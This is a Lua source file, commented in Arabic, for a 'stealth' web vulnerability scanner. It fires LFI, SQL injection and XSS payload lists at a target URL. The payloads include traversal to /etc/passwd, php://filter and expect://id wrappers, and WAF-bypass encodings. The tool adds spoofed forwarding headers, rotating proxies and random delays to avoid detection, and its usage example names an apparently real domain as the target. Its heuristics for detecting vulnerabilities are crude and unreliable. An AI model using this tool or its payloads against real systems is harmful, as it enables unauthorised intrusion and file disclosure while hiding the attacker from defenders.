-- Advanced Stealth Vulnerability Scanner in Lua
-- مع ميزات التخفي المتقدمة وتخطي جدران الحماية

local http = require("socket.http")
local ltn12 = require("ltn12")
local url = require("socket.url")
local ssl = require("ssl")
local https = require("ssl.https")

-- إعدادات التخفي المتقدمة
local StealthScanner = {}
StealthScanner.__index = StealthScanner

-- قائمة وكلاء المستخدم المتقدمين
local USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
}

-- قائمة البروكسيات (يمكن تحديثها)
local PROXIES = {
    "http://proxy1.example.com:8080",
    "http://proxy2.example.com:8080",
    "socks5://proxy3.example.com:1080"
}

-- حمولات LFI المتقدمة مع تقنيات التخفي
local LFI_PAYLOADS = {
    -- الترميز الأساسي
    "../../../../etc/passwd",
    "../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    
    -- ترميز URL
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    -- ترميز Unicode
    "%u2215%u0065%u0074%u0063%u2215%u0070%u0061%u0073%u0073%u0077%u0064",
    
    -- ترميز Base64
    "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
    
    -- تقنيات التهرب المتقدمة
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "file:///etc/passwd",
    
    -- حمولات خاصة بتخطي WAF
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
}

-- حمولات SQL Injection المتقدمة
local SQL_PAYLOADS = {
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT null,null,null--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' OR '1'='1",
    "1' OR 1 -- -",
    "1' OR 1=1--",
    "1' UNION SELECT 1,2,3--",
    "1' AND (SELECT COUNT(*) FROM users) > 0--"
}

-- حمولات XSS المتقدمة
local XSS_PAYLOADS = {
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<button onclick=alert('XSS')>Click</button>"
}

-- دالة إنشاء هيدرات عشوائية متقدمة
local function generate_random_headers(stealth_level)
    local headers = {}
    
    -- User-Agent عشوائي
    headers["User-Agent"] = USER_AGENTS[math.random(1, #USER_AGENTS)]
    
    -- هيدرات متقدمة حسب مستوى التخفي
    if stealth_level >= 2 then
        headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        headers["Accept-Language"] = "en-US,en;q=0.5"
        headers["Accept-Encoding"] = "gzip, deflate"
        headers["DNT"] = "1"
        headers["Connection"] = "keep-alive"
        headers["Upgrade-Insecure-Requests"] = "1"
    end
    
    if stealth_level >= 3 then
        headers["X-Forwarded-For"] = "192.168.1." .. math.random(1, 255)
        headers["X-Real-IP"] = "10.0.0." .. math.random(1, 255)
        headers["X-Forwarded-Proto"] = "https"
        headers["X-Forwarded-Host"] = "localhost"
        headers["Referer"] = "https://www.google.com/search?q=" .. math.random(1000, 9999)
    end
    
    if stealth_level >= 4 then
        headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        headers["Pragma"] = "no-cache"
        headers["Expires"] = "0"
        headers["X-Frame-Options"] = "SAMEORIGIN"
        headers["X-Content-Type-Options"] = "nosniff"
    end
    
    if stealth_level >= 5 then
        headers["X-Random-Header"] = tostring(math.random(1000000, 9999999))
        headers["X-Timestamp"] = tostring(os.time())
        headers["X-Session-ID"] = string.format("%08x-%04x-%04x-%04x-%012x",
            math.random(0, 0xffffffff),
            math.random(0, 0xffff),
            math.random(0, 0xffff),
            math.random(0, 0xffff),
            math.random(0, 0xffffffffffff))
    end
    
    return headers
end

-- دالة إضافة تأخير عشوائي
local function random_delay(min_seconds, max_seconds)
    local delay = math.random(min_seconds * 100, max_seconds * 100) / 100
    print(string.format("⏱️  إضافة تأخير: %.2f ثانية", delay))
    os.execute("sleep " .. delay)
end

-- دالة ترميع الحمولة حسب مستوى التخفي
local function encode_payload(payload, stealth_level)
    if stealth_level <= 2 then
        return payload
    end
    
    -- ترميع URL للمستوى 3+
    if stealth_level == 3 then
        return string.gsub(payload, "([%.%/%\?%&%=%s])", function(c)
            return string.format("%%%02X", string.byte(c))
        end)
    end
    
    -- ترميع متقدم للمستوى 4+
    if stealth_level >= 4 then
        -- مزج من تقنيات الترميع المختلفة
        local encoded = payload
        encoded = string.gsub(encoded, "%.%.", "....")  -- تمويه المسارات
        encoded = string.gsub(encoded, "/", "%2f")     -- ترميع الشرطة المائلة
        encoded = string.gsub(encoded, " ", "%20")    -- ترميع المسافات
        return encoded
    end
    
    return payload
end

-- دالة إنشاء طلب HTTP مع ميزات التخفي
local function stealth_request(target_url, method, data, headers, proxy, timeout)
    local response = {}
    local body = data or ""
    
    -- إعدادات الطلب
    local request_params = {
        url = target_url,
        method = method,
        headers = headers,
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response),
        timeout = timeout or 30
    }
    
    -- إعداد البروكسي إذا كان متاحاً
    if proxy then
        request_params.proxy = proxy
    end
    
    -- تنفيذ الطلب
    local success, code, response_headers, status
    
    if string.find(target_url, "^https://") then
        success, code, response_headers, status = https.request(request_params)
    else
        success, code, response_headers, status = http.request(request_params)
    end
    
    local response_body = table.concat(response)
    
    return {
        success = success,
        status_code = code,
        headers = response_headers,
        status = status,
        body = response_body
    }
end

-- دالة اختبار LFI مع التخفي
local function test_lfi_stealth(target, stealth_level)
    print(string.format("🔍 اختبار LFI المتقدم (مستوى التخفي: %d)", stealth_level))
    
    local results = {}
    local found_vulnerabilities = {}
    
    for i, payload in ipairs(LFI_PAYLOADS) do
        print(string.format("\n📡 اختبار الحمولة رقم %d/%d", i, #LFI_PAYLOADS))
        
        -- ترميع الحمولة
        local encoded_payload = encode_payload(payload, stealth_level)
        local test_url = target .. "?file=" .. encoded_payload
        
        -- إنشاء هيدرات عشوائية
        local headers = generate_random_headers(stealth_level)
        
        -- اختيار بروكسي عشوائي
        local proxy = nil
        if stealth_level >= 3 and #PROXIES > 0 then
            proxy = PROXIES[math.random(1, #PROXIES)]
        end
        
        -- تأخير عشوائي
        random_delay(0.5, 3.0)
        
        -- تنفيذ الطلب
        local response = stealth_request(test_url, "GET", nil, headers, proxy)
        
        if response.success and response.body then
            -- فحص مؤشرات الاستغلال الناجح
            local is_vulnerable = false
            local vulnerability_type = nil
            
            -- فحص ملف /etc/passwd
            if string.find(response.body, "root:") and string.find(response.body, ":%d+:%d+:") then
                is_vulnerable = true
                vulnerability_type = "LFI - Unix Password File"
            end
            
            -- فحص ملف windows\win.ini
            if string.find(response.body, "%[windows%]") then
                is_vulnerable = true
                vulnerability_type = "LFI - Windows Configuration"
            end
            
            -- فحص ملف boot.ini
            if string.find(response.body, "%[boot loader%]") then
                is_vulnerable = true
                vulnerability_type = "LFI - Windows Boot Configuration"
            end
            
            -- فحص PHP Wrapper
            if string.find(response.body, "phpinfo") then
                is_vulnerable = true
                vulnerability_type = "LFI - PHP Wrapper"
            end
            
            if is_vulnerable then
                print(string.format("🚨 ثغرة LFI تم اكتشافها! (%s)", vulnerability_type))
                table.insert(found_vulnerabilities, {
                    payload = payload,
                    encoded_payload = encoded_payload,
                    url = test_url,
                    type = vulnerability_type,
                    response_length = #response.body,
                    status_code = response.status_code
                })
            else
                print(string.format("✅ لم يتم اكتشاف ثغرات بالحمولة: %s", string.sub(payload, 1, 50)))
            end
            
            table.insert(results, {
                payload = payload,
                encoded_payload = encoded_payload,
                url = test_url,
                status_code = response.status_code,
                response_length = #response.body,
                is_vulnerable = is_vulnerable,
                vulnerability_type = vulnerability_type
            })
        else
            print(string.format("❌ فشل الطلب: %s", response.status or "Unknown error"))
        end
    end
    
    return {
        total_tests = #results,
        found_vulnerabilities = found_vulnerabilities,
        all_results = results
    }
end

-- دالة اختبار SQL Injection مع التخفي
local function test_sql_injection_stealth(target, stealth_level)
    print(string.format("🔍 اختبار SQL Injection المتقدم (مستوى التخفي: %d)", stealth_level))
    
    local results = {}
    local found_vulnerabilities = {}
    
    for i, payload in ipairs(SQL_PAYLOADS) do
        print(string.format("\n📡 اختبار الحمولة رقم %d/%d", i, #SQL_PAYLOADS))
        
        -- ترميع الحمولة
        local encoded_payload = encode_payload(payload, stealth_level)
        local test_url = target .. "?id=" .. encoded_payload
        
        -- إنشاء هيدرات عشوائية
        local headers = generate_random_headers(stealth_level)
        
        -- تأخير عشوائي
        random_delay(0.5, 2.0)
        
        -- تنفيذ الطلب
        local response = stealth_request(test_url, "GET", nil, headers)
        
        if response.success and response.body then
            -- فحص مؤشرات SQL Injection
            local is_vulnerable = false
            local vulnerability_type = nil
            
            -- فحص أخطاء قاعدة البيانات
            if string.find(response.body:lower(), "mysql") or
               string.find(response.body:lower(), "postgresql") or
               string.find(response.body:lower(), "sqlite") or
               string.find(response.body:lower(), "oracle") then
                is_vulnerable = true
                vulnerability_type = "SQL Injection - Database Error"
            end
            
            -- فحص نتائج UNION
            if string.find(response.body:lower(), "union") or
               string.find(response.body:lower(), "select") then
                is_vulnerable = true
                vulnerability_type = "SQL Injection - UNION Attack"
            end
            
            if is_vulnerable then
                print(string.format("🚨 ثغرة SQL Injection تم اكتشافها! (%s)", vulnerability_type))
                table.insert(found_vulnerabilities, {
                    payload = payload,
                    encoded_payload = encoded_payload,
                    url = test_url,
                    type = vulnerability_type,
                    response_length = #response.body,
                    status_code = response.status_code
                })
            else
                print(string.format("✅ لم يتم اكتشاف ثغرات بالحمولة: %s", string.sub(payload, 1, 30)))
            end
            
            table.insert(results, {
                payload = payload,
                encoded_payload = encoded_payload,
                url = test_url,
                status_code = response.status_code,
                response_length = #response.body,
                is_vulnerable = is_vulnerable,
                vulnerability_type = vulnerability_type
            })
        else
            print(string.format("❌ فشل الطلب: %s", response.status or "Unknown error"))
        end
    end
    
    return {
        total_tests = #results,
        found_vulnerabilities = found_vulnerabilities,
        all_results = results
    }
end

-- دالة اختبار XSS مع التخفي
local function test_xss_stealth(target, stealth_level)
    print(string.format("🔍 اختبار XSS المتقدم (مستوى التخفي: %d)", stealth_level))
    
    local results = {}
    local found_vulnerabilities = {}
    
    for i, payload in ipairs(XSS_PAYLOADS) do
        print(string.format("\n📡 اختبار الحمولة رقم %d/%d", i, #XSS_PAYLOADS))
        
        -- ترميع الحمولة
        local encoded_payload = encode_payload(payload, stealth_level)
        local test_url = target .. "?input=" .. encoded_payload
        
        -- إنشاء هيدرات عشوائية
        local headers = generate_random_headers(stealth_level)
        
        -- تأخير عشوائي
        random_delay(0.5, 2.0)
        
        -- تنفيذ الطلب
        local response = stealth_request(test_url, "GET", nil, headers)
        
        if response.success and response.body then
            -- فحص مؤشرات XSS
            local is_vulnerable = false
            local vulnerability_type = nil
            
            -- فحص تنفيذ السكربت
            if string.find(response.body, "alert%('XSS'%)") or
               string.find(response.body, "alert%(%"XSS%"%)") then
                is_vulnerable = true
                vulnerability_type = "XSS - Script Execution"
            end
            
            -- فحص تضمين HTML
            if string.find(response.body, "<script>") or
               string.find(response.body, "<iframe") then
                is_vulnerable = true
                vulnerability_type = "XSS - HTML Injection"
            end
            
            if is_vulnerable then
                print(string.format("🚨 ثغرة XSS تم اكتشافها! (%s)", vulnerability_type))
                table.insert(found_vulnerabilities, {
                    payload = payload,
                    encoded_payload = encoded_payload,
                    url = test_url,
                    type = vulnerability_type,
                    response_length = #response.body,
                    status_code = response.status_code
                })
            else
                print(string.format("✅ لم يتم اكتشاف ثغرات بالحمولة: %s", string.sub(payload, 1, 30)))
            end
            
            table.insert(results, {
                payload = payload,
                encoded_payload = encoded_payload,
                url = test_url,
                status_code = response.status_code,
                response_length = #response.body,
                is_vulnerable = is_vulnerable,
                vulnerability_type = vulnerability_type
            })
        else
            print(string.format("❌ فشل الطلب: %s", response.status or "Unknown error"))
        end
    end
    
    return {
        total_tests = #results,
        found_vulnerabilities = found_vulnerabilities,
        all_results = results
    }
end

-- دالة حفظ النتائج
local function save_results(results, filename)
    local file = io.open(filename, "w")
    if file then
        file:write("Advanced Stealth Security Scan Results\n")
        file:write("=====================================\n\n")
        
        file:write(string.format("تاريخ الفحص: %s\n", os.date("%Y-%m-%d %H:%M:%S")))
        file:write(string.format("إجمالي الاختبارات: %d\n", results.total_tests))
        file:write(string.format("الثغرات المكتشفة: %d\n\n", #results.found_vulnerabilities))
        
        if #results.found_vulnerabilities > 0 then
            file:write("الثغرات المكتشفة:\n")
            file:write("-----------------\n\n")
            
            for i, vuln in ipairs(results.found_vulnerabilities) do
                file:write(string.format("%d. نوع الثغرة: %s\n", i, vuln.type))
                file:write(string.format("   الحمولة: %s\n", vuln.payload))
                file:write(string.format("   الحمولة المرمعة: %s\n", vuln.encoded_payload))
                file:write(string.format("   الرابط: %s\n", vuln.url))
                file:write(string.format("   كود الاستجابة: %d\n", vuln.status_code))
                file:write(string.format("   طول الاستجابة: %d بايت\n\n", vuln.response_length))
            end
        end
        
        file:write("\nجميع نتائج الاختبار:\n")
        file:write("-------------------\n\n")
        
        for i, result in ipairs(results.all_results) do
            file:write(string.format("%d. الحمولة: %s\n", i, result.payload))
            file:write(string.format("   الحالة: %s\n", result.is_vulnerable and "مكتشف" or "آمن"))
            if result.is_vulnerable then
                file:write(string.format("   نوع الثغرة: %s\n", result.vulnerability_type))
            end
            file:write(string.format("   كود الاستجابة: %d\n", result.status_code))
            file:write(string.format("   طول الاستجابة: %d بايت\n\n", result.response_length))
        end
        
        file:close()
        print(string.format("💾 تم حفظ النتائج في: %s", filename))
    else
        print(string.format("❌ فشل حفظ الملف: %s", filename))
    end
end

-- الدالة الرئيسية
local function main()
    print("🛡️  Advanced Stealth Vulnerability Scanner")
    print("========================================")
    print("فاحص ثغرات متقدم مع ميزات التخفي")
    print("")
    
    -- التحقق من المعاملات
    if #arg < 2 then
        print("الاستخدام: lua advanced_stealth_scanner.lua <target_url> <stealth_level> [scan_type]")
        print("  target_url: الرابط المستهدف (مثال: https://example.com/test.php)")
        print("  stealth_level: مستوى التخفي (1-5)")
        print("  scan_type: نوع الفحص (all, lfi, sql, xss) - اختياري، الافتراضي: all")
        print("")
        print("مثال: lua advanced_stealth_scanner.lua https://dxp.salam.sa/test.php 5 all")
        return
    end
    
    local target_url = arg[1]
    local stealth_level = tonumber(arg[2]) or 3
    local scan_type = arg[3] or "all"
    
    -- التحقق من صحة المدخلات
    if stealth_level < 1 or stealth_level > 5 then
        print("❌ مستوى التخفي يجب أن يكون بين 1 و 5")
        return
    end
    
    print(string.format("🎯 الهدف: %s", target_url))
    print(string.format("🔒 مستوى التخفي: %d", stealth_level))
    print(string.format("🔍 نوع الفحص: %s", scan_type))
    print("")
    
    -- بدء الفحص
    local start_time = os.time()
    local all_results = {}
    
    if scan_type == "all" or scan_type == "lfi" then
        print("🚀 بدء فحص LFI...")
        local lfi_results = test_lfi_stealth(target_url, stealth_level)
        all_results.lfi = lfi_results
        
        if #lfi_results.found_vulnerabilities > 0 then
            save_results(lfi_results, "stealth_lfi_results.txt")
        end
        print("")
    end
    
    if scan_type == "all" or scan_type == "sql" then
        print("🚀 بدء فحص SQL Injection...")
        local sql_results = test_sql_injection_stealth(target_url, stealth_level)
        all_results.sql = sql_results
        
        if #sql_results.found_vulnerabilities > 0 then
            save_results(sql_results, "stealth_sql_results.txt")
        end
        print("")
    end
    
    if scan_type == "all" or scan_type == "xss" then
        print("🚀 بدء فحص XSS...")
        local xss_results = test_xss_stealth(target_url, stealth_level)
        all_results.xss = xss_results
        
        if #xss_results.found_vulnerabilities > 0 then
            save_results(xss_results, "stealth_xss_results.txt")
        end
        print("")
    end
    
    -- ملخص النتائج
    local end_time = os.time()
    local total_time = end_time - start_time
    
    print("📊 ملخص الفحص:")
    print("================")
    print(string.format("⏱️  وقت الفحص الكلي: %d ثانية", total_time))
    
    local total_vulnerabilities = 0
    if all_results.lfi and #all_results.lfi.found_vulnerabilities > 0 then
        print(string.format("🔓 ثغرات LFI المكتشفة: %d", #all_results.lfi.found_vulnerabilities))
        total_vulnerabilities = total_vulnerabilities + #all_results.lfi.found_vulnerabilities
    end
    
    if all_results.sql and #all_results.sql.found_vulnerabilities > 0 then
        print(string.format("🔓 ثغرات SQL المكتشفة: %d", #all_results.sql.found_vulnerabilities))
        total_vulnerabilities = total_vulnerabilities + #all_results.sql.found_vulnerabilities
    end
    
    if all_results.xss and #all_results.xss.found_vulnerabilities > 0 then
        print(string.format("🔓 ثغرات XSS المكتشفة: %d", #all_results.xss.found_vulnerabilities))
        total_vulnerabilities = total_vulnerabilities + #all_results.xss.found_vulnerabilities
    end
    
    print(string.format("🔒 إجمالي الثغرات المكتشفة: %d", total_vulnerabilities))
    
    if total_vulnerabilities > 0 then
        print("")
        print("⚠️  تم اكتشاف ثغرات أمنية! تحقق من ملفات النتائج للحصول على التفاصيل.")
    else
        print("")
        print("✅ لم يتم اكتشاف ثغرات أمنية واضحة.")
    end
    
    print("")
    print("🔒 تذكر: استخدم هذه الأدوات فقط للاختبار الأمني المصرح به.")
end

-- تشغيل البرنامج
main()